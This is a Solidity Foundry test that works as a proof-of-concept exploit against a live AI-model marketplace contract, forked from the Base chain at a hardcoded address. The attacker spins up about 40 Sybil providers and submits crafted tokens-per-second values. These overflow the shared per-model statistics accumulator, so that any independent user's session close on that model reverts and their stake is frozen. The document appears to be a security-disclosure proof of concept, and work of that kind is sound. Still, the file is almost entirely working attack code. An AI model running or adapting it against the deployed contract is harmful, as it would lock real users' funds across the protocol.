// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test} from "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); function approve(address,uint256) external returns(bool); }
interface ILum {
    function getToken() external view returns (address);
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(address modelOwner_, bytes32 baseModelId_, bytes32 ipfsCID_, uint256 fee_, uint256 amount_, string calldata name_, string[] calldata tags_) external;
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function openSession(address user_, uint256 amount_, bool isDirectPaymentFromUser_, bytes calldata approvalEncoded_, bytes calldata signature_) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
}

// CRITICAL escalation: corrupt the SHARED per-model modelStats accumulator (fed by each provider's first
// session) -> any user closing a session on that model, via ANY provider, bricks. Protocol-wide freeze
// of one model's users.
contract ModelBrick is Test {
    ILum constant L = ILum(0x6aBE1d282f72B474E54527D93b979A4f64d3030a);
    IERC20 MOR;
    int64 constant XMAX = 2147483647;
    int64 constant IMAX = 9223372036854775807;
    uint256 constant PRICE = 10000000000;
    bytes32 modelId;
    // mirror of modelStats.tpsScaled1000: add(prStats.mean=tps, modelCount) per provider first-session
    int64 mMean; int64 mSqSum;
    function _mirrorAdd(int64 x, int64 c) internal { int64 om=mMean; mMean=mMean+(x-mMean)/c; mSqSum=mSqSum+(x-mMean)*(x-om); }
    function _isqrt(uint256 n) internal pure returns(uint256 x){ if(n==0)return 0; x=n; uint256 y=(x+1)/2; while(y<x){x=y;y=(x+n/x)/2;} }
    function _sign(uint256 pk, bytes memory enc) internal pure returns (bytes memory) {
        bytes32 eth = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(enc)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, eth); return abi.encodePacked(r,s,v);
    }
    // one full session by `who` (provider==who, signs its own approval/receipt) with receipt tps
    function _session(address who, uint256 pk, bytes32 bidId, uint32 tps) internal returns (bool ok) {
        bytes memory approval = abi.encode(bidId, block.chainid, address(0), uint128(block.timestamp));
        vm.prank(who);
        bytes32 sid = L.openSession(who, 2e15, true, approval, _sign(pk, approval));
        vm.warp(block.timestamp + 1);
        bytes memory receipt = abi.encode(sid, block.chainid, uint128(block.timestamp), tps, uint32(0));
        vm.prank(who);
        try L.closeSession(receipt, _sign(pk, receipt)) { ok = true; } catch { ok = false; }
    }
    function _mkProvider(string memory label) internal returns (address a, uint256 pk, bytes32 bidId) {
        (a, pk) = makeAddrAndKey(label);
        deal(address(MOR), a, 100e18);
        vm.prank(a); MOR.approve(address(L), type(uint256).max);
        vm.prank(a); L.providerRegister(a, 1e18, "http://p");
        vm.prank(a); bidId = L.postModelBid(a, modelId, PRICE);
    }

    function test_model_wide_brick() public {
        vm.createSelectFork("https://base-rpc.publicnode.com");
        MOR = IERC20(L.getToken());
        // model owner registers a popular model (any unprivileged EOA)
        (address mo, uint256 moPk) = makeAddrAndKey("MODELOWNER");
        deal(address(MOR), mo, 100e18);
        vm.prank(mo); MOR.approve(address(L), type(uint256).max);
        string[] memory tags = new string[](0);
        vm.prank(mo); L.modelRegister(mo, bytes32("popular"), bytes32("cid"), 0, 1e18, "popular", tags);
        modelId = L.getModelId(mo, bytes32("popular"));

        // Attacker spins up N sybil providers; each does ONE first-session for the model with crafted tps,
        // which feeds modelStats.tpsScaled1000.add(prStats.mean=tps, modelCount=1,2,3,...).
        int64 modelCount = 0;
        for (uint256 i = 1; i <= 40; i++) {
            modelCount += 1;
            int64 tpsSigned;
            if (i == 1) tpsSigned = XMAX;
            else if (i == 2) tpsSigned = -XMAX;
            else {
                int64 margin = IMAX - mSqSum;
                if (margin < 50000) break;
                int64 d = int64(int256(_isqrt(uint256(int256(margin)) * 9 / 10)));
                if (d < 1) d = 1;
                tpsSigned = mMean + d;
            }
            uint32 tpsU = uint32(int32(tpsSigned));
            (address pa, uint256 ppk, bytes32 pbid) = _mkProvider(string(abi.encodePacked("SP", vm.toString(i))));
            bool ok = _session(pa, ppk, pbid, tpsU);
            if (!ok) { emit log_named_uint("attacker provider session reverted at i", i); break; }
            _mirrorAdd(int32(tpsU), modelCount);
        }
        emit log_named_int("providers used", modelCount);
        emit log_named_int("mirror modelStats sqSum", mSqSum);
        emit log_named_int("margin to int64 max", IMAX - mSqSum);

        // VICTIM: a completely independent provider + user, first session on the SAME model, normal tps.
        (address vp, uint256 vpk, bytes32 vbid) = _mkProvider("VICTIM_PROVIDER");
        bool victimClosed = _session(vp, vpk, vbid, 50000);
        emit log_named_string("victim (independent provider) close", victimClosed ? "SUCCEEDED (no brick)" : "REVERTED -> stake FROZEN (model-wide)");
        assertFalse(victimClosed, "model-wide brick expected");
    }
}
